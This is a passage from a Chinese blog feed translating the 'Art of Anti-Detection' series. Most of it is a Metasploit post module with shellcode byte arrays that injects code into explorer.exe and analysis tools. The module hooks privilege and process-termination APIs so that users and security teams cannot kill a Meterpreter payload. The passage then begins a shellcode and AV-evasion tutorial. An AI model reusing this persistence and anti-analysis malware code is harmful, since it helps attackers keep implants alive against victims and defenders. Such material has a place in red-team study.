class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">class MetasploitModule &lt; Msf::Post</span><br><span class="line"></span><br><span class="line">  include Msf::Post::File</span><br><span class="line">  include Msf::Post::Windows::Process</span><br><span class="line"></span><br><span class="line">  def initialize(info = &#123;&#125;)</span><br><span class="line">    super(update_info(info,</span><br><span class="line">        'Name'          =&gt; 'Process Protector',</span><br><span class="line">        'Description'   =&gt; %q&#123;</span><br><span class="line">          This module will protect the given process with injecting special shellcodes and disabling key API functions using inline hooking.</span><br><span class="line">        &#125;,</span><br><span class="line">        'License'       =&gt; MSF_LICENSE,</span><br><span class="line">        'Author'        =&gt; [ 'Ege Balcı' ],</span><br><span class="line">        'Platform'      =&gt; [ 'win'],</span><br><span class="line">        'SessionTypes'  =&gt; [ 'meterpreter']</span><br><span class="line">    ))</span><br><span class="line">        </span><br><span class="line">    register_options([</span><br><span class="line">      OptString.new('PID', [false, 'The target process ID for the UAC elevation.' ]),</span><br><span class="line">      OptBool.new('LOOP', [false, 'Continiously check running processes for elevation prevention.' ]),</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure><br><br>在声明了初始元数据和类之后，现在我们将构造run方法。首先，我们需要检查该会话是否为meterpreter会话。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># Make sure we meet the requirements before running the script, note no need to return</span></span><br><span class="line">    <span class="preprocessor"># unless <span class="keyword">error</span></span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> session.type != <span class="string">"meterpreter"</span></span><br></pre></td></tr></table></figure><br><br>现在检查会话类型之后，我们将检查是否指定了特殊的PID值。如果不是，则此模块应针对包含我们的Meterpreter会话的进程。我们可以通过一个简单的检查来做到这一点，Metasploit中的每个post模块都有一个<a href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Client" target="_blank" rel="external">client类</a>。根据ruby文档，此类提供了一个与Rex开发后接口兼容的接口，该接口试图公开其功能集。此类旨在驱动单个meterpreter客户端会话。通过调用client.sys.process.getpid，我们可以获得获取会话的进程的当前进程ID。<br><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if datastore['PID'].to_s == ''</span><br><span class="line">  pid = client.sys.process.getpid.to_i</span><br><span class="line">else</span><br><span class="line">  pid = datastore['PID'].to_i</span><br><span class="line">end</span><br></pre></td></tr></table></figure><br><br>为了避免在shellcode程序代码中重复使用块API，我们将声明一次并在所有shellcode程序代码中使用它们。实际上，Metasploit已经具有生成内置在其中的block_api.asm的机制。但是由于懒，我直接在模块内部声明了已组装的block_api.asm。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># https:<span class="comment">//github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm</span></span></span><br><span class="line">block_api_32 = <span class="string">""</span></span><br><span class="line">block_api_32 &lt;&lt; <span class="string">"\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c"</span></span><br><span class="line"><span class="preprocessor"># SNIP ...</span></span><br><span class="line">block_api_32 &lt;&lt; <span class="string">"\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a"</span></span><br><span class="line">block_api_32 &lt;&lt; <span class="string">"\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d"</span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor"># https:<span class="comment">//github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/block/block_api.asm</span></span></span><br><span class="line">block_api_64 = <span class="string">""</span></span><br><span class="line">block_api_64 &lt;&lt; <span class="string">"\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48"</span></span><br><span class="line"><span class="preprocessor"># SNIP ...</span></span><br><span class="line">block_api_64 &lt;&lt; <span class="string">"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a"</span></span><br><span class="line">block_api_64 &lt;&lt; <span class="string">"\x48\x8b\x12\xe9\x4f\xff\xff\xff"</span></span><br></pre></td></tr></table></figure><br><br>我知道看起来很难看，如果您知道在利用漏洞利用模块中生成块API的更好方法，请告诉我。我还以相同的方式汇编并声明了我们准备的shellcode。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">prevent_elevate_32 = <span class="string">""</span></span><br><span class="line">prevent_elevate_32 &lt;&lt; <span class="string">"\xfc\xe8\xb6\x00\x00\x00\x5b\xe8\x2f\x00\x00\x00"</span></span><br><span class="line">prevent_elevate_32 &lt;&lt; <span class="string">"\x89\xc6\x68\x10\xe1\x8a\xc3\xe8\x23\x00\x00\x00"</span></span><br><span class="line"> <span class="preprocessor"># SNIP ...</span></span><br><span class="line">prevent_elevate_32 &lt;&lt; <span class="string">"\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51"</span></span><br><span class="line">prevent_elevate_32 &lt;&lt; <span class="string">"\xc3\x5f\x5f\x5a\x8b\x12\xeb\x8e\x5d\x68\x2d\xf9"</span></span><br><span class="line">prevent_elevate_32 &lt;&lt; <span class="string">"\x7f\xe5\xff\xd5\x68\x75\x1f\x0a\x33\xff\xd5\xe8"</span></span><br><span class="line">prevent_elevate_32 &lt;&lt; <span class="string">"\x82\x00\x00\x00"</span></span><br><span class="line">prevent_elevate_32 &lt;&lt; block_api_32</span><br><span class="line">prevent_elevate_32 &lt;&lt; <span class="string">"\x5d\xbb\xe0\x1d\x2a\x0a\x68\xa6\x95\xbd"</span></span><br><span class="line">prevent_elevate_32 &lt;&lt; <span class="string">"\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05"</span></span><br><span class="line">prevent_elevate_32 &lt;&lt; <span class="string">"\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"</span></span><br><span class="line"></span><br><span class="line">prevent_elevate_64 = <span class="string">""</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\xfc\xe8\x16\x01\x00\x00\x5b\xe8\x49\x00\x00\x00"</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\x48\x83\xc4\x20\x48\x89\xc6\x41\xba\x10\xe1\x8a"</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\xc3\xe8\x37\x00\x00\x00\x48\x83\xc4\x20\x6a\x00"</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\x49\x89\xe1\x41\xb8\x40\x00\x00\x00\xba\x04\x00"</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\x00\x00\x48\x89\xf1\xff\xd0\x58\xe8\x04\x00\x00"</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\x00\x48\x31\xc0\xc3\x5a\xb9\x04\x00\x00\x00\x8a"</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\x02\x88\x06\x48\xff\xc6\x48\xff\xc2\xe2\xf4\x53"</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\xc3\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65"</span></span><br><span class="line"> <span class="preprocessor"># SNIP ...</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\xf9\x7f\xe5\xff\xd5\x41\xba\x75\x1f\x0a\x33\xff"</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\xd5\xe8\xc8\x00\x00\x00"</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; block_api_64</span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\x5d\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95"</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a"</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00"</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\x59\x41\x89\xda\xff\xd5"</span></span><br><span class="line"></span><br><span class="line">self_defense_64 = <span class="string">""</span></span><br><span class="line">self_defense_64 &lt;&lt; <span class="string">"\xfc\xe8\xc8\x00\x00\x00"</span></span><br><span class="line">self_defense_64 &lt;&lt; block_api_64</span><br><span class="line">self_defense_64 &lt;&lt; <span class="string">"\x5d\x41\xba\x49\x47\xc6\x62\xff\xd5\x49"</span></span><br><span class="line">self_defense_64 &lt;&lt; <span class="string">"\x89\xc0\xba\x00\x00\x00\x00\xb9\xff\x00\x1f\x00"</span></span><br><span class="line">self_defense_64 &lt;&lt; <span class="string">"\x41\xba\xee\x95\xb6\x50\xff\xd5\x48\x89\xc3\x6a"</span></span><br><span class="line"> <span class="preprocessor"># SNIP ...</span></span><br><span class="line">self_defense_64 &lt;&lt; <span class="string">"\x78\x69\x74\x55\x50\x48\x89\xe2\x41\xba\x49\xf7"</span></span><br><span class="line">self_defense_64 &lt;&lt; <span class="string">"\x02\x78\xff\xd5\x48\x89\xc5\xe8\x00\x00\x00\x00"</span></span><br><span class="line">self_defense_64 &lt;&lt; <span class="string">"\x58\xb9\xb7\x01\x00\x00\xc6\x00\x00\x48\xff\xc8"</span></span><br><span class="line">self_defense_64 &lt;&lt; <span class="string">"\xe2\xf8\x6a\x00\xff\xd5"</span></span><br><span class="line"></span><br><span class="line">self_defense_32= <span class="string">""</span></span><br><span class="line">self_defense_32 &lt;&lt; <span class="string">"\xfc\xe8\x82\x00\x00\x00"</span></span><br><span class="line">self_defense_32 &lt;&lt; block_api_32</span><br><span class="line">self_defense_32 &lt;&lt; <span class="string">"\x5d\x68\x49\x47\xc6\x62\xff\xd5"</span></span><br><span class="line">self_defense_32 &lt;&lt; <span class="string">"\x50\x6a\x00\x68\xff\x0f\x1f\x00\x68\xee\x95\xb6"</span></span><br><span class="line">self_defense_32 &lt;&lt; <span class="string">"\x50\xff\xd5\x89\xc3\x6a\x00\x68\x70\x69\x33\x32"</span></span><br><span class="line"> <span class="preprocessor"># SNIP ...</span></span><br><span class="line">self_defense_32 &lt;&lt; <span class="string">"\x5b\x0c\x8b\x43\x0c\xc7\x40\x20\xff\xff\xff\x00"</span></span><br><span class="line">self_defense_32 &lt;&lt; <span class="string">"\xb9\x44\x01\x00\x00\xe8\x00\x00\x00\x00\x58\xc6"</span></span><br><span class="line">self_defense_32 &lt;&lt; <span class="string">"\x00\x00\x48\xe2\xfa\x6a\x00\xff\xd5"</span></span><br></pre></td></tr></table></figure><br><br>现在，在声明了shellcode之后，我们需要遍历所有进程并将shellcode注入可能导致我们麻烦的进程中。以下代码实现循环遍历所有进程，注入并钩住AdjustTokenPrivileges和RtlSetDaclSecurityDescriptor API的shellcode。我们使用client.sys.process.processes方法访问目标计算机上的进程信息。如果进程名称是explorer.exe或我们在顶部声明的任何分析工具，它将通过调用execute_shellcode函数来注入我们的shellcode。<br><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">analysis_tools =['taskmgr.exe','procexp64.exe','ida.exe','ida64.exe','windbg.exe','x32dbg.exe','ollydbg.exe','tasklist.exe','cmd.exe','powershell.exe','cheatengine-x86_x64.exe']</span><br><span class="line"></span><br><span class="line">os = client.sys.config.sysinfo['OS']</span><br><span class="line">print_status("Target OS -&gt; #&#123;os&#125;")</span><br><span class="line"></span><br><span class="line">client.sys.process.processes.each do |p|</span><br><span class="line">  begin      </span><br><span class="line">    # Check Payload Arch</span><br><span class="line">    if 'explorer.exe' === p['name'].to_s.downcase or analysis_tools.include? p['name'].to_s.downcase</span><br><span class="line">      print_status("Hooking RtlSetDaclSecurityDescriptor on #&#123;p['name']&#125; (#&#123;p['arch']&#125;)")</span><br><span class="line">      print_status("Hooking AdjustTokenPrivileges on #&#123;p['name']&#125; (#&#123;p['arch']&#125;)")</span><br><span class="line">      if 'x64' === p['arch'].to_s</span><br><span class="line">        execute_shellcode(prevent_elevate_64,nil,p['pid'].to_i)</span><br><span class="line">      else</span><br><span class="line">        execute_shellcode(prevent_elevate_32,nil,p['pid'].to_i)</span><br><span class="line">      end</span><br><span class="line">      print_good("UAC elevation disabled for #&#123;p['name']&#125;")</span><br><span class="line">    end</span><br><span class="line">  rescue =&gt; e</span><br><span class="line">    print_error("API hooking failed: #&#123;e&#125;")</span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure><br><br>现在，我们需要考虑运行的操作系统版本是否高于Windows 7的情况。我们可以通过访问client.sys.config.sysinfo [‘OS’]结构来简单地进行检查。我们将检查版本字符串，并决定是使用保护进程方法还是使用挂钩API的方法。如果我们需要挂钩NtOpenProcess和TerminateProcess API，我们可以简单地在API挂钩shellcode中更改函数名称哈希。<br><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">if os.to_s.include? "Windows 7" or os.to_s.include? "Windows XP" or os.to_s.include? "2008"</span><br><span class="line">  client.sys.process.processes.each do |p|</span><br><span class="line">    # Check Payload Arch</span><br><span class="line">    if pid.to_i === p['pid'].to_i</span><br><span class="line">      print_status('Injecting self defense shellcode...')</span><br><span class="line">      if 'x64' === p['arch'].to_s</span><br><span class="line">        execute_shellcode(self_defense_64,nil,pid)</span><br><span class="line">      else</span><br><span class="line">        execute_shellcode(self_defense_32,nil,pid)</span><br><span class="line">      end</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line">  print_good('Self defense active !')</span><br><span class="line">else</span><br><span class="line">  # Set NtOpenProcess &amp; TerminateProcess hashes</span><br><span class="line">  prevent_terminate_64 = prevent_elevate_64.sub! "\x2D\xF9\x7F\xE5", "\x87\xDC\xCA\x5E"</span><br><span class="line">  prevent_terminate_32 = prevent_elevate_32.sub! "\x2D\xF9\x7F\xE5", "\x87\xDC\xCA\x5E"</span><br><span class="line"></span><br><span class="line">  prevent_terminate_64 = prevent_elevate_64.sub! "\x75\x1F\x0A\x33", "\xA3\x9D\xA1\x23"</span><br><span class="line">  prevent_terminate_32 = prevent_elevate_32.sub! "\x75\x1F\x0A\x33", "\xA3\x9D\xA1\x23"</span><br><span class="line"></span><br><span class="line">  hooked = ""</span><br><span class="line">  while 1</span><br><span class="line">    client.sys.process.processes.each do |p|</span><br><span class="line">      # Check Payload Arch</span><br><span class="line">      if analysis_tools.include? p['name'].to_s.downcase</span><br><span class="line">        print_status("Hooking TerminateProcess on #&#123;p['name']&#125; (#&#123;p['arch']&#125; - #&#123;p['pid']&#125;)")</span><br><span class="line">        print_status("Hooking NtOpenProcess on #&#123;p['name']&#125; (#&#123;p['arch']&#125; - #&#123;p['pid']&#125;)")</span><br><span class="line">        begin</span><br><span class="line">          if 'x64' === p['arch'].to_s</span><br><span class="line">            execute_shellcode(prevent_terminate_64,nil,p['pid'].to_i)</span><br><span class="line">          else</span><br><span class="line">            execute_shellcode(prevent_terminate_32,nil,p['pid'].to_i)</span><br><span class="line">          end</span><br><span class="line">          hooked &lt;&lt; p['pid'].to_s+','</span><br><span class="line">          print_good("Process termination disabled for #&#123;p['name']&#125;")</span><br><span class="line">        rescue =&gt; e</span><br><span class="line">          print_error("API hooking failed: #&#123;e&#125;")</span><br><span class="line">        end</span><br><span class="line">      end</span><br><span class="line">    end</span><br><span class="line">    if not datastore['LOOP']</span><br><span class="line">      break</span><br><span class="line">    end           </span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure><br><br>在替换函数哈希时，请记住字节序问题，哈希值将以相反的顺序存储。当您查看上面的源代码时，您会发现在while条件内调用execute_shellcode函数，该条件取决于我们post模块的LOOP参数。这种机制是必要的，因为当用户在执行我们的模块后创建新的任务管理器进程时，该进程仍将能够终止其他进程。因此，我们需要一种将对抗终止进程shellcode持续注入到新创建的过程中的机制。仅对于反进程终止shellcode才需要使用此代码，因为其他代码已注入到资源管理器和我们自己的进程中，因此用户不太可能重新启动资源管理器。最后，这是我们的post模块的最后一部分。这是最终的self_defense.rb模块。只需将其移至~/.msf4/modules/post/windows目录下，即可将其添加到Metasploit。下面我们来看操作步骤。<br>首先，我们执行Meterpreter载荷。<br><div align="center"><br><img src="/img/anti_av4_exec_meterpreter.gif" align><br></div>

<p>启动会话后，我们通过键入以下内容执行模块run post/windows/self_defense.</p>
<p><div align="center"><br><img src="/img/anti_av4_self_defense.gif" align><br></div><br>现在，我们的载荷受到了保护，用户无法以管理员身份终止程序。<br>可以通过各种方式来改进此模块，尤其是可以使用简单的机制来检查handle参数并仅在将进程句柄传递给函数时才禁用它，而不是直接禁用OpenProcess API。同样，除了将我们的shellcode硬编码到模块源中之外，还有一种更动态的方式来生成它们。特别是集成Metasploit的有效载荷编码功能，可以使我们在每次执行时生成唯一的shellcode。我将在存储库中添加新的自保护shellcode。</p>
<h2 id="参考">参考</h2><ul>
<li><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess" target="_blank" rel="external">https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess</a></li>
<li><a href="https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges" target="_blank" rel="external">https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges</a></li>
<li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/nf-wdm-rtlsetdaclsecuritydescriptor" target="_blank" rel="external">https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/nf-wdm-rtlsetdaclsecuritydescriptor</a></li>
<li><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-blockinput" target="_blank" rel="external">https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-blockinput</a></li>
<li><a href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Client" target="_blank" rel="external">https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Client</a></li>
<li><a href="https://docs.microsoft.com/en-us/windows/win32/api/sddl/nf-sddl-convertstringsecuritydescriptortosecuritydescriptora" target="_blank" rel="external">https://docs.microsoft.com/en-us/windows/win32/api/sddl/nf-sddl-convertstringsecuritydescriptortosecuritydescriptora</a></li>
<li><a href="https://docs.microsoft.com/tr-tr/windows/win32/secauthz/security-descriptor-string-format" target="_blank" rel="external">https://docs.microsoft.com/tr-tr/windows/win32/secauthz/security-descriptor-string-format</a></li>
<li><a href="https://docs.microsoft.com/tr-tr/windows/win32/secgloss/s-gly" target="_blank" rel="external">https://docs.microsoft.com/tr-tr/windows/win32/secgloss/s-gly</a></li>
<li><a href="https://docs.microsoft.com/tr-tr/windows/win32/secgloss/d-gly" target="_blank" rel="external">https://docs.microsoft.com/tr-tr/windows/win32/secgloss/d-gly</a></li>
</ul>
<p><em>原文链接：<a href="https://pentest.blog/art-of-anti-detection-4-self-defense/" target="_blank" rel="external">https://pentest.blog/art-of-anti-detection-4-self-defense/</a></em></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>在反检测的艺术系列中，我们主要研究了如何绕过自动化安全产品的方法，但是在这一部分中，我们将重点介绍几种自保护方法，保护我们在目标终端上的载荷免受其实际用户的破坏。用户可能是缺乏网络技术的员工或也有可能是网络安全部门的蓝队成员。我们的目的是在没有任何特权的情况下存活并在目标终端中隐藏我们的存在。但是，在继续学习之前，我建议您阅读本系列的前几篇文章，因为这些自保护方法包含大量的有关shellcoding和API hooking的前置知识，现在我们开始吧！<br>]]>
    
    </summary>
    
      <category term="反病毒" scheme="http://www.youngroe.com/tags/%E5%8F%8D%E7%97%85%E6%AF%92/"/>
    
      <category term="Cybersecurity" scheme="http://www.youngroe.com/categories/Cybersecurity/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[反检测的艺术3-shellcode的魔力 （翻译）]]></title>
    <link href="http://www.youngroe.com/2020/09/10/Cybersecurity/art-of-anti-detection-3-art-of-anti-detection-3-shellcode-alchemy/"/>
    <id>http://www.youngroe.com/2020/09/10/Cybersecurity/art-of-anti-detection-3-art-of-anti-detection-3-shellcode-alchemy/</id>
    <published>2020-09-10T11:39:22.000Z</published>
    <updated>2021-03-17T14:37:55.966Z</updated>
    <content type="html"><![CDATA[<p> 本文将讨论编写shellcode的基础知识和相关改变，包含汇编级别的编码器/解码器设计以及几种绕过漏洞缓解方案的方法，如微软的增强缓解应急工具包（Microsoft’s Enhanced Mitigation Experience Toolkit，EMET）。为了理解本文的内容，读者需要至少具有一定的x86汇编方面的基础，并对COFF和PE等基本文件格式有相当的了解，也可以读之前的文章<a href="http://www.youngroe.com/2020/09/03/Cybersecurity/art-of-anti-detection-1-introduction-to-av-detection-techniques/">反检测的艺术1-反病毒软件及检测技术概述</a>、<a href="http://www.youngroe.com/2020/09/04/Cybersecurity/art-of-anti-detection-2-pe-backdoor-manufacturing/">反检测的艺术2-如何制作PE文件后门</a>理解反病毒软件使用的基本检测技术的内部工作原理和相关术语。<br><a id="more"></a></p>
<h2 id="0x00_相关术语">0x00 相关术语</h2><h3 id="进程环境块（PEB）">进程环境块（PEB）</h3><p>在计算机中进程环境块（缩写为PEB）是Windows NT操作系统中的一种数据结构。它是操作系统内部使用的不透明数据结构，其中大多数字段除操作系统外均不供其他人使用。微软在其MSDN库文档（仅记录了一些字段）中指出，该结构可能会在Windows的未来版本中更改。PEB包含涉及整个进程很多阐述，包括全局上下文，启动参数，程序映像加载器的数据结构，程序映像基址以及用于为进程范围的数据结构提供互斥的同步对象。</p>
<h3 id="导入表（IAT）">导入表（IAT）</h3><p>导入表是一种用于查找地址的表，用于程序调用其他模块中的函数时查找地址。它可以采用按序号导入和按名称导入两种形式。由于已编译的程序无法知道其依赖的库的存储位置，因此，每当进行API调用时，都需要进行间接跳转。当动态链接器加载模块并将它们连接在一起时，它会将实际地址写入IAT插槽，以便它们指向相应库函数的所在的内存位置。</p>
<h3 id="数据执行保护（DEP）">数据执行保护（DEP）</h3><p>数据执行保护（DEP）是一组硬件和软件技术，可对内存执行安全检查，以帮助防止恶意代码在系统上运行。在Microsoft Windows XP Service Pack 2（SP2）和Microsoft Windows XP Tablet PC Edition 2005中，DEP由硬件和软件强制执行。DEP的主要好处是可以帮助防止从数据页执行代码。通常，不会从默认堆和栈中执行代码。硬件强制的DEP检测从这些位置运行的代码，并在执行时引发异常。软件强制的DEP可以帮助防止恶意代码利用Windows中的异常处理机制。</p>
<h3 id="地址布局随机化（ASLR）">地址布局随机化（ASLR）</h3><p>地址空间布局随机化（ASLR）是一种有关防止缓冲区溢出攻击的计算机安全技术。为了防止攻击者可靠地跳转到内存中的某个特定漏洞位置利用功能，ASLR随机排列进程的关键数据区域的地址空间位置，包括可执行文件的基地址以及栈、堆和依赖库地址。</p>
<h3 id="stdcall调用约定">stdcall调用约定</h3><p>stdcall调用约定是Pascal调用约定的一种变体，在该约定中，被调用方负责清理栈，但参数按照_cdecl调用约定的顺序从右到左入栈。寄存器EAX，ECX和EDX被指定在函数内使用。返回值存储在EAX寄存器中。 stdcall是Microsoft Win32 API和Open Watcom C ++的标准调用约定。</p>
<h2 id="0x01_相关介绍">0x01 相关介绍</h2><p>Shellcode在网络安全领域中扮演着非常重要的角色，它被广泛用于许多恶意软件和漏洞利用中。那么，什么是shellcode？ Shellcode是一串数据，将被解释为CPU上的指令，编写Shellcode的主要目的是利用漏洞，该漏洞允许在系统上执行任意代码（例如溢出漏洞），因为Shellcode可以直接在内存内运行，大量恶意代码都利用它。名称shellcode的原因是一般shellcode在执行时会返回命令shell。但随着时间的推移，含义已经演变，如今几乎所有编译器生成的程序都可以转换为shellcode，因为编写shellcode涉及深入了解目标体系结构和操作系统的汇编语言后，本文将假定读者知道如何在Windows和Linux环境下以汇编形式编写程序。互联网上有很多开源的shellcode，但是为了利用新的漏洞和不同的漏洞，每个网络安全研究人员都应该能够编写自己的复杂shellcode，并且编写自己的shellcode有助于理解操作的关键概念。本文的目的是解释基本的shellcode概念，展示降低shellcode的检测率并绕过某些漏洞缓解措施的方法。</p>
<h2 id="0x02_shellcode编写基础">0x02 shellcode编写基础</h2><p>为不同的操作系统编写shellcode要使用不同的方法，与Windows不同，基于UNIX的操作系统提供了一种通过int 0x80接口与内核进行通信的直接方法，基于UNIX的操作系统内部的所有syscall都有一个唯一的编号，即调用0x80中断代码（int 0x80），内核使用给定的编号和参数执行syscall，但这是问题所在，Windows没有直接的内核接口，这意味着必须有指向函数的具体指针（内存地址）才能调用它们，不幸的是，对功能地址进行硬编码并不能完全解决问题，Windows内部的每个功能地址在每个Service Pack，版本甚至配置中都会发生变化，使用硬编码地址使Shellcode高度依赖版本，在Windows上编写与版本无关的Shellcode可以解决寻址问题可能会贯穿整个解决地址问题，这可以通过在运行时动态查找函数地址来实现。</p>
<h2 id="0x03_解决地址问题">0x03 解决地址问题</h2><p>在整个过程中，shellcode编写者一直在寻找在运行时查找Windows API函数地址的巧妙方法，在本文中，我们将重点介绍一种称为PEB解析的方法，该方法使用Process Environment Block（PEB）数据结构来查找基地址。在分析已加载的DLL并通过分析导出表（EAT）来找到其函数地址时，metasploit框架内的几乎所有版本无关的Windows shellcode都使用此技术来查找Windows API函数的地址，这种方法利用了在Windows中，可以通过FS段寄存器找到线程环境块（TEB）地址，当执行Shellcode时，TEB块包含很多有用的数据，包括我们正在寻找的PEB结构在内存中，我们需要从TEB块的向后48个字节，<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xor eax, eax</span><br><span class="line">mov edx, [fs:eax+<span class="number">48</span>]</span><br></pre></td></tr></table></figure></p>
<p>现在我们有一个指向PEB结构的指针，</p>
<div align="center"><br><img src="/img/anti_av3_TEB.png" align><br></div>

<p>获取PEB结构指针之后，现在我们将从PEB块的开头开始向后移动12个字节，以获取PEB块内部的Ldr数据结构指针的地址，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov edx, [edx+<span class="number">12</span>]</span><br></pre></td></tr></table></figure>
<div align="center"><br><img src="/img/anti_av3_PEB.png" align><br></div>

